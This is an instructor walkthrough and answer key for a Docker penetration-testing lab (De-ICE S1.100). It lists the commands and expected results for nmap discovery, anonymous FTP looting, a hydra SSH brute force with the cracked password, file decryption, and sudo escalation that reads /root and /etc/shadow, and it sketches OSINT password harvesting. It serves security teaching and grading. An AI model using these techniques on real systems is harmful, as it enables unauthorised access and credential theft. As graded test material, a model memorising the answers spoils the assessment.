# De-ICE S1.100 - Instructor Walkthrough & Answer Key

This document provides complete solutions for educators running the De-ICE S1.100 Docker lab.

## Answer Key (For Marking)

Maps directly to the worksheet's phases, sections, and point values in
`Midterm2026.md`. Use this to mark the student's filled-in tables and
blanks — full solutions and reasoning are below in the walkthrough proper.

### Phase 1: Reconnaissance (18 points)

**1.1 Network Discovery (8 points)** — Command: `nmap -sn 10.10.10.0/24`
| IP Address | Hostname | Status |
|------------|----------|---------|
| 10.10.10.1 | (docker bridge gateway) | up |
| 10.10.10.2 | kali-attacker (self) | up |
| 10.10.10.10 | target-web | up |
| 10.10.10.11 | target-ssh | up |
| 10.10.10.12 | target-ftp | up |
| 10.10.10.13 | target-smtp | up |
| 10.10.10.14 | target-mail | up |
The worksheet table has 3 rows — full credit for any 3 of the 5 real
targets (not the gateway or the attacker itself); award partial credit if
some targets are missing.

**1.2 Port Scanning (10 points)** — Command: `nmap -sC -sV 10.10.10.10 10.10.10.11 10.10.10.12 10.10.10.13 10.10.10.14`
| Host | Port | Service | Version |
|------|------|---------|---------|
| 10.10.10.10 | 80 | http | Apache httpd (2.4.x) |
| 10.10.10.11 | 22 | ssh | OpenSSH |
| 10.10.10.12 | 21 | ftp | vsftpd |
| 10.10.10.13 | 1025 | smtp | Mailpit ESMTP |
| 10.10.10.13 | 8025 | http | Mailpit Web UI |
| 10.10.10.14 | 110 | pop3 | Dovecot |
| 10.10.10.14 | 143 | imap | Dovecot |
The worksheet table has 5 rows — full credit for any 5 of these 7.

### Phase 2: Web Application Enumeration (12 points)

**2.1 Web Content Analysis (8 points)** — Command: `curl http://10.10.10.10`
| Full Name | Email | Potential Username |
|-----------|-------|-------------------|
| Alice Adams | aadams@de-ice.net | aadams |
| Bob Banter | bbanter@de-ice.net | bbanter |
| Carol Coffee | ccoffee@de-ice.net | ccoffee |
| Dave Deeds | ddeeds@de-ice.net | ddeeds |
| Eve Eikman | eeikman@de-ice.net | eeikman |
**Flag captured:** `flag{midterm_web_recon}` — in an HTML comment at the
end of the page; only visible via `curl`/view-source, not the rendered
page. Award this point only if the student found it (requires looking at
raw HTML, not just the table).

**2.2 Username Generation (4 points)** — any list containing the 5
usernames above (`aadams`, `bbanter`, `ccoffee`, `ddeeds`, `eeikman`).
`root`/`admin` as extras are fine but not required.

### Phase 3: FTP Enumeration (12 points)

**3.1 FTP Access (6 points)**
Connection: `ftp 10.10.10.12`. Auth: `anonymous` / `anonymous` (or blank
password). Success: Yes.
**Flag captured:** `flag{midterm_ftp_anon_access}` — `pub/flag.txt`.

**3.2 FTP File Discovery (6 points)**
Directories: `pub/`, `pub/incoming/`.
| Filename | Size | Location | Downloaded |
|----------|------|----------|------------|
| flag.txt | 30 bytes | pub/ | — |
| salary_dec2003.csv.enc | ~320 bytes | pub/incoming/ | ✓ (required) |
Full credit requires the encrypted salary file downloaded — it's needed
for Phase 5.

### Phase 4: SSH Attack (23 points)

**4.1 Password List Creation (6 points)** — top 10 lines of
`/usr/share/wordlists/rockyou.txt` plus each discovered username reversed
(`aadams`→`smadaa`, etc.). Credit if the list includes `smadaa` by either
method.

**4.2 SSH Brute Force (12 points)** — Command:
`hydra -L users.txt -P passwords.txt 10.10.10.11 ssh -t 4`
**Successful credentials:** `aadams` / `smadaa`.

**4.3 SSH Access (5 points)** — Login successful: Yes.
```
whoami: aadams
id: uid=1001(aadams) gid=1001(aadams) groups=1001(aadams)
```
**Flag captured:** `flag{midterm_ssh_foothold}` — `/home/aadams/user.txt`.

### Phase 5: File Analysis (18 points)

**5.1 System Exploration (6 points)** — any reasonable discovery commands
(`ls -la`, `find . -name "*.txt" -o -name "*.csv"`, `pwd`). Interesting
file: none locally on `target-ssh` beyond `user.txt` — the encrypted file
was already pulled from FTP in Phase 3.

**5.2 File Decryption (12 points)**
Encrypted file: `salary_dec2003.csv.enc`.
**Successful password:** `HeadOfSecurity`.
```bash
openssl enc -aes-256-cbc -d -salt -in salary_dec2003.csv.enc -out salary.csv -k "HeadOfSecurity"
```
**Decrypted content (first 3 lines):**
```
Employee Name,Department,Annual Salary,Start Date
Alice Adams,Human Resources,55000,2001-03-15
Bob Banter,Information Technology,65000,2000-08-22
```
**Flag captured:** `flag{midterm_file_decrypted}` — last line of the
decrypted CSV.

### Phase 6: Privilege Escalation (17 points)

**6.1 Sudo Enumeration (6 points)** — Command: `sudo -l`
**Sudo rights found:** `(ALL) NOPASSWD: /bin/cat`

**6.2 Root Exploitation (6 points)** — Command: `sudo cat /root/root.txt`
**Flag captured:** `flag{midterm_root_privesc}`

**6.3 Reflection (5 points)** — any answer that identifies: `cat` run as
root via `sudo` can read *any* file on the system, including
`/etc/shadow` or other users' private files — the binary itself has no
concept of "harmless," only the OS permission check `sudo` bypasses. Full
credit for citing GTFOBins or naming the general principle (NOPASSWD +
a file-read/write/exec primitive = root, regardless of which binary).

## Lab Setup Verification

### 1. Start the Lab Environment
```bash
docker compose up -d
docker exec -it midterm2026-attacker bash
```

### 2. Verify All Services Are Running
```bash
# From attacker container
nmap -sn 10.10.10.0/24
```

**Expected Output:**
```
Nmap scan report for 10.10.10.1
Host is up (0.000011s latency).
Nmap scan report for 10.10.10.13
Host is up (0.000011s latency).
Nmap scan report for 10.10.10.11
Host is up (0.000011s latency).
Nmap scan report for 10.10.10.12  
Host is up (0.000011s latency).
Nmap scan report for 10.10.10.10
Host is up (0.000011s latency).
Nmap scan report for 10.10.10.14
Host is up (0.000011s latency).
Nmap scan report for 10.10.10.2 (attacker)
Host is up (0.000011s latency).
```

**Target IPs Discovered:**
- 10.10.10.13 - SMTP server (Mailpit)
- 10.10.10.11 - SSH server  
- 10.10.10.12 - FTP server
- 10.10.10.10 - Web server
- 10.10.10.14 - Mail server (Dovecot POP3/IMAP)
- 10.10.10.2 - Attacker machine (Kali)

## Phase 1: Reconnaissance (Expected Student Results)

### Network Discovery and Port Scanning
```bash
# Step 1: Network discovery 
nmap -sn 10.10.10.0/24

# Step 2: Port scan discovered targets
nmap -sC -sV 10.10.10.13 10.10.10.11 10.10.10.12 10.10.10.10 10.10.10.14
```

**Expected Ports Discovered:**
- 10.10.10.13: 1025/tcp (SMTP - Mailpit), 8025/tcp (HTTP - Mailpit Web UI)
- 10.10.10.11: 22/tcp (SSH - OpenSSH)
- 10.10.10.12: 21/tcp (FTP - vsftpd)
- 10.10.10.10: 80/tcp (HTTP - Apache)
- 10.10.10.14: 110/tcp (POP3 - Dovecot), 143/tcp (IMAP - Dovecot)

### Web Enumeration
```bash
curl http://10.10.10.10
```

**Expected Findings:**
Students should extract these employee names and emails:
- Alice Adams → aadams@de-ice.net → username: aadams
- Bob Banter → bbanter@de-ice.net → username: bbanter
- Carol Coffee → ccoffee@de-ice.net → username: ccoffee
- Dave Deeds → ddeeds@de-ice.net → username: ddeeds
- Eve Eikman → eeikman@de-ice.net → username: eeikman

## Phase 2: Service Enumeration (Answers)

### FTP Service Investigation
```bash
ftp 10.10.10.12
# Username: anonymous
# Password: (just press Enter)

ftp> ls
ftp> cd pub
ftp> ls
ftp> cd incoming
ftp> ls
ftp> binary
ftp> get salary_dec2003.csv.enc
ftp> quit
```

**Expected Result:** Successfully downloads encrypted salary file

### SSH Service Banner
```bash
ssh 10.10.10.11
```

**Expected Banner:** OpenSSH server accepting password authentication

## Phase 3: Exploitation (Step-by-Step Solutions)

### Create Wordlists
```bash
# Username list
cat > users.txt << 'EOF'
aadams
bbanter
ccoffee
ddeeds
eeikman
root
admin
EOF

# Password list: top 10 of rockyou.txt + each username reversed.
# Top 10 of rockyou.txt alone won't crack this — the intended vector is the
# reversed-username guess ("smadaa" is "aadams" backwards).
head -n 10 /usr/share/wordlists/rockyou.txt > passwords.txt
for u in aadams bbanter ccoffee ddeeds eeikman; do
  echo "$u" | rev >> passwords.txt
done
```

### SSH Brute Force Attack

**Educational Brute Force Attack:**
```bash
hydra -L users.txt -P passwords.txt 10.10.10.11 ssh -t 4
```

**Expected Successful Credential:**
```
[22][ssh] host: 10.10.10.11   login: aadams   password: smadaa
```

**Teaching Points for Discussion:**

1. **Password Pattern Recognition:**
   - The successful password "smadaa" is "aadams" reversed
   - This demonstrates common weak password patterns users create
   - Students should learn to recognize and exploit such patterns

2. **Real-World OSINT Password Generation:**
   In practice, passwords would be discovered through:
   - **Social Media Research:** Facebook, LinkedIn, Twitter profiles revealing:
     - Pet names, children's names, birthdays
     - Hobbies, favorite sports teams, locations
     - Company events, project names
   - **Professional Networks:** LinkedIn job history, skills, connections
   - **Public Records:** Property records, business registrations
   - **Company Website:** Employee bios, company history, product names
   - **Breach Databases:** Previous password patterns for the target

3. **Advanced Password Lists:**
   For comprehensive attacks, use:
   ```bash
   # Standard comprehensive wordlist
   hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 10.10.10.11 ssh -t 4
   
   # Custom wordlist from OSINT research
   # Create passwords.txt from gathered intelligence
   ```

4. **Educational Limitation:**
   This lab uses reversed usernames for time efficiency. In real engagements, extensive OSINT would be conducted first to build context-specific password lists.

### SSH Access and Exploration
```bash
ssh aadams@10.10.10.11
# Password: smadaa

# Once inside:
whoami
id
ls -la
pwd
find . -name "*.txt" -o -name "*.csv" 2>/dev/null
```

**Expected Findings:**
- User: aadams
- Home directory access
- Limited privileges (non-root user)

## Phase 4: File Analysis & Decryption

### Decrypt Salary File
```bash
# Try common passwords for decryption
openssl enc -aes-256-cbc -d -salt -in salary_dec2003.csv.enc -out salary.csv -k "HeadOfSecurity"
```

**Expected Success:** File decrypts successfully

### View Decrypted Content
```bash
cat salary.csv
```

**Expected Content:**
```
Employee Name,Department,Annual Salary,Start Date
Alice Adams,Human Resources,55000,2001-03-15
Bob Banter,Information Technology,65000,2000-08-22
Carol Coffee,Finance,58000,2002-01-10
Dave Deeds,Marketing,52000,2003-05-18
Eve Eikman,Legal Affairs,72000,1999-11-30
# flag{midterm_file_decrypted}
```

## Phase 5: Privilege Escalation

### Password Pattern Analysis
Students should notice that `smadaa` is `aadams` reversed, suggesting:
1. Passwords may be reversed words
2. Other users might have similar patterns

### Enumerate Sudo Rights
```bash
sudo -l
```
**Expected result:**
```
User aadams may run the following commands on target-ssh:
    (ALL) NOPASSWD: /bin/cat
```

### GTFOBins Sudo Escalation
`cat` run as root via `sudo` can read any file directly — no interactive
shell escape needed for this binary (unlike `less`/`vi`/etc.). Same
NOPASSWD-misconfiguration primitive as week8's `deskuser`/`less` box, just
a simpler GTFOBins entry.
```bash
sudo cat /root/root.txt
```
**Expected Result:** `flag{midterm_root_privesc}`

To confirm it generalizes beyond this one file (worth demonstrating live):
```bash
sudo cat /etc/shadow
```

## Common Student Errors & Troubleshooting

### Error: "Connection Refused"
**Cause:** Student using wrong IP address/port
**Solution:** Ensure using correct IP addresses discovered from network scan and correct ports

### Error: "Host not found"
**Cause:** Student not in attacker container
**Solution:** `docker exec -it midterm2026-attacker bash`

### Error: "Hydra shows no results"
**Cause:** Wrong port or service specification
**Solution:** From the attacker container (internal docker network), SSH is on its
real port, 22 — no `-s` flag needed. `-s 2222` is only for reaching this target from
the *host machine* outside Docker (the `"2222:22"` port mapping in docker-compose.yaml).

### Error: "FTP login fails"
**Cause:** Student entering wrong credentials
**Solution:** Use `anonymous` / `anonymous` or just press Enter for password

### Error: "File decryption fails"
**Cause:** Wrong password or algorithm
**Solution:** Use exact command: `openssl enc -aes-256-cbc -d -salt -in salary_dec2003.csv.enc -out salary.csv -k "HeadOfSecurity"`

## Assessment Rubric

### Basic Level (Pass)
- [ ] Successfully discovers open ports
- [ ] Extracts usernames from website
- [ ] Connects to FTP anonymously
- [ ] Downloads encrypted file

### Intermediate Level (Credit)
- [ ] Successfully brute forces SSH
- [ ] Gains SSH access with aadams account
- [ ] Decrypts salary file
- [ ] Documents findings clearly

### Advanced Level (Distinction)
- [ ] Enumerates all services thoroughly
- [ ] Identifies password patterns
- [ ] Finds the sudo NOPASSWD misconfiguration (`sudo -l`) and escalates to root
- [ ] Provides detailed security recommendations

## Security Lessons Learned

### Key Vulnerabilities Demonstrated
1. **Information Disclosure:** Employee data exposed on website
2. **Weak Authentication:** Easily guessable SSH password
3. **Anonymous FTP:** Sensitive files accessible without authentication
4. **Weak Encryption:** Predictable encryption password
5. **Service Enumeration:** Multiple unnecessary services exposed
6. **Sudo Misconfiguration:** NOPASSWD GTFOBins entry (`/bin/cat`) grants full root file read

### Defensive Recommendations Students Should Identify
1. Remove employee details from public website
2. Implement strong password policies
3. Disable anonymous FTP access
4. Use strong encryption keys
5. Close unnecessary service ports
6. Implement multi-factor authentication
7. Regular security audits and penetration testing
8. Audit sudoers entries against GTFOBins before granting NOPASSWD rights

## Lab Cleanup
```bash
# From host system
docker compose down
docker system prune -f
```

## Troubleshooting Lab Issues

### Container Won't Start
```bash
docker compose down
docker system prune -f
docker compose up -d
```

### Network Issues
```bash
docker network prune -f
docker compose up -d
```

### Permission Issues
```bash
chmod +x attacker-tools/*.sh
```

This walkthrough provides complete solutions and expected outcomes for all lab phases. Students should be able to achieve all listed results following the penetration testing methodology.